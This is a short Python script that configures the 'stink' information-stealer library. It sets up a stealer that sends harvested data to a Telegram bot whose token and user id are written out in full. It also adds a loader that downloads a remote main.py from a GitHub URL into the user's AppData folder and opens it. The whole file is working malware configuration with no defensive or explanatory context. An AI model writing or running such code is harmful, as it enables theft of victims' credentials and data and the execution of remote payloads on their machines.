from os import environ, path

from stink import Stealer, Senders, Loader

if __name__ == '__main__':
    Stealer(
        senders=[
            Senders.telegram(token="7476964336:AAGG2K75rjfjXnieAcj2-_QJKig6pzKWDuY", user_id=1937567596)
        ],
        loaders=[
            Loader(
                url="https://github.com/afcunotify/stink/blob/master/main.py?raw=true",
                destination_path=path.join(environ["USERPROFILE"], "AppData", "main.py"),
                open_file=True
            )
        ]
    ).run()
